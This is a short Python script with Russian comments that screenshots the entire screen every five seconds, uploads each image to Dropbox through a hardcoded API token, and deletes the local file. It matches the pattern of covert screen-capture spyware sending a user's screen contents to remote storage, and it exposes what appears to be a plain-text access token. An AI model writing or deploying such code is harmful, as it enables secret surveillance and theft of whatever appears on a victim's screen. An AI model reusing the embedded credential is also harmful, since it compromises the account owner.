import pyautogui
import datetime
import dropbox
import os
import time
ACCESS_TOKEN = "sl.BwqqrQNx6mF64-JCBwu-VOWGZprLXyokqY0d_mZrItk_Oxovb4PRUFJXMREAj41N_6zVScOxtfMBtfiRA9bJkbUH9EBpwCo2CSUFBhNk4XIwXwhN_T5bNACdBS0YqUqJ_TWojqmYRmFa"
dbx = dropbox.Dropbox(ACCESS_TOKEN)
def take_screenshot():
    # Получаем текущую дату и время
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    # Создаем имя файла
    screenshot_file = f"screenshot_{timestamp}.png"
    # Делаем скриншот экрана
    screenshot = pyautogui.screenshot()
    # Сохраняем скриншот в файл
    screenshot.save(screenshot_file)
    return screenshot_file

def upload_to_dropbox(file_path):
    with open(file_path, 'rb') as f:
        dbx.files_upload(f.read(), f"/{file_path}")
    print("Файл успешно загружен в Dropbox!")

while(True):
    # Получаем скриншот
    screenshot_file = take_screenshot()
    # Загружаем скриншот в Dropbox
    upload_to_dropbox(screenshot_file)
    # Удаляем скриншот
    os.remove(screenshot_file)
    time.sleep(5)   